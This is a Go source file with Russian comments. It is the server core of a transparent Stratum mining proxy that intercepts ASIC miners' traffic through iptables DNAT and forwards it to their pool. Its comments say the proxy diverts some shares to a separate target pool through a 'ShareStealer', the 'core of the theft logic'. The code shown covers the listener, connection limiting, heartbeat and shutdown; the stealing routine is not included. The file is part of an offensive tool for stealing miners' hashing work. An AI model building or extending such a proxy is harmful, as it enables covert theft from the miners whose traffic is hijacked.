// Пакет proxy — сердце системы: TCP-сервер, обработка соединений и
// вся логика перехвата/перенаправления шар.
//
// Архитектурно это прозрачный Stratum-прокси:
//   ASIC -> (iptables DNAT) -> proxy server -> реальный пул (upstream)
//                                  |
//                                  +---> целевой пул (только «укушенные» шары)
// Каждое TCP-соединение обрабатывается в отдельной goroutine, поэтому
// прокси способен держать одновременно тысячи ASIC-устройств.
package proxy

import (
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

// maxConnections — жёсткий потолок одновременных соединений. Защита от
// атаки (произвольная нагрузка на accept-порт) и от перерасхода ресурсов.
// filler: при достижении лимита новые соединения сразу закрываются.
const maxConnections = 50000

// Server TCP прокси для майнинг-трафика.
// Содержит адрес слушающего порта, адрес upstream-пула и ссылку на
// ShareStealer (логику кражи). WaitGroup wg используется для корректного
// завершения: мы ждём все активные соединения при shutdown.
type Server struct {
	listenAddr  string         // адрес, где слушаем (0.0.0.0:8443)
	upstream    string         // адрес реального пула из конфига (fallback)
	upstreamSSL bool           // TLS к upstream (только для прямого теста)
	transparent bool           // определять реальный адресат через SO_ORIGINAL_DST
	stealer     *ShareStealer  // ядро логики кражи шар
	disc        *Discovery     // реестр «база» пул+воркер (этап 3)
	wg          sync.WaitGroup // счётчик активных соединений

	// closeOnce гарантирует, что listener закрывается ровно один раз.
	closeOnce sync.Once
	ln        net.Listener

	// semaphore — ограничение одновременных соединений (chan struct{}
	// ёмкостью maxConnections). Занятие слота — на время обработки сессии.
	sem chan struct{}

	// hb — heartbeat живости процесса: «бьётся» в accept-цикле и фоновым
	// тикером. Монитор /health и watchdog смотрят на его свежесть.
	hb            *Heartbeat
	stopHeartbeat chan struct{}
}

// NewServer создаёт новый прокси-сервер с заданными параметрами.
// transparent — включать восстановление реального адресата (SO_ORIGINAL_DST);
// disc — реестр пул+воркер (nil — пустой); hb — heartbeat для /health;
// если nil — создаётся автоматически.
func NewServer(listenAddr, upstream string, upstreamSSL, transparent bool, stealer *ShareStealer, disc *Discovery, hb *Heartbeat) *Server {
	if hb == nil {
		hb = NewHeartbeat()
	}
	if disc == nil {
		disc = NewDiscovery()
	}
	return &Server{
		listenAddr:    listenAddr,
		upstream:      upstream,
		upstreamSSL:   upstreamSSL,
		transparent:   transparent,
		stealer:       stealer,
		disc:          disc,
		sem:           make(chan struct{}, maxConnections),
		hb:            hb,
		stopHeartbeat: make(chan struct{}),
	}
}

// Run запускает TCP listener и обрабатывает входящие соединения.
// Работает в бесконечном accept loop. Для graceful shutdown main вызывает
// Shutdown(), который закрывает listener — accept возвращает ошибку
// ErrClosed и цикл завершается.
func (s *Server) Run() error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return err
	}
	s.ln = ln
	defer s.ln.Close()

	// Фоновый heartbeat: «бьётся» каждые heartbeatInterval, чтобы /health
	// и watchdog видели прокси живым даже при полном отсутствии трафика.
	go s.beatLoop()
	defer close(s.stopHeartbeat)

	log.Printf("[LISTEN] mining proxy on %s -> %s (ssl=%v)", s.listenAddr, s.upstream, s.upstreamSSL)

	for {
		// Принимаем новое соединение от ASIC-майнера.
		conn, err := ln.Accept()
		if err != nil {
			// Listener закрыт через Shutdown() — выходим чисто.
			if isClosedErr(err) {
				log.Printf("[LISTEN] listener closed, accept loop exiting")
				return nil
			}
			log.Printf("[LISTEN] accept: %v", err)
			continue
		}

		// Свежий heartbeat на каждом принятом соединении — признак того,
		// что accept-цикл реально работает, а не застрял.
		s.hb.Beat()

		// Лимит активных соединений: если слоты заняты — закрываем новое,
		// чтобы не перегрузить сервер. Занятие слота неблокирующее.
		select {
		case s.sem <- struct{}{}:
		default:
			log.Printf("[LISTEN] max connections reached, rejecting %s", conn.RemoteAddr())
			conn.Close()
			continue
		}

		// Каждое соединение обрабатываем в отдельной goroutine,
		// чтобы тысячи ASIC-ов обслуживались параллельно.
		pass := ProxyPass{
			ListenAddr:  s.listenAddr,
			Fallback:    s.upstream,
			FallbackSSL: s.upstreamSSL,
			Transparent: s.transparent,
		}
		s.wg.Add(1)
		go func(c net.Conn) {
			defer s.wg.Done()
			defer func() { <-s.sem }()
			HandleConnection(c, pass, s.stealer, s.disc)
		}(conn)
	}
}

// Shutdown корректно завершает работу сервера.
// Закрывает listener (accept-цикл завершится), затем ждёт завершения всех
// активных соединений (не роняя их на полуслове).
func (s *Server) Shutdown() {
	s.closeOnce.Do(func() {
		if s.ln != nil {
			s.ln.Close()
		}
	})
	s.wg.Wait()
}

// isClosedErr определяет, является ли ошибка accept результатом закрытия
// listener (нормальное завершение), а не сетевым сбоем.
// Go 1.13 не имеет net.ErrClosed, поэтому проверяем текст ошибки.
func isClosedErr(err error) bool {
	if err == nil {
		return false
	}
	return strings.Contains(err.Error(), "use of closed network connection")
}

// beatLoop периодически обновляет heartbeat, чтобы /health и watchdog
// видели прокси живым и без входящих соединений (простой, но рабочий).
// Завершается закрытием stopHeartbeat (делается в Run через defer).
func (s *Server) beatLoop() {
	ticker := time.NewTicker(heartbeatInterval)
	defer ticker.Stop()
	for {
		select {
		case <-s.stopHeartbeat:
			return
		case <-ticker.C:
			s.hb.Beat()
		}
	}
}

// Heartbeat возвращает heartbeat сервера (для подключения к /health при
// ручном сценарии, когда monitor стартует раньше сервера).
func (s *Server) Heartbeat() *Heartbeat {
	return s.hb
}
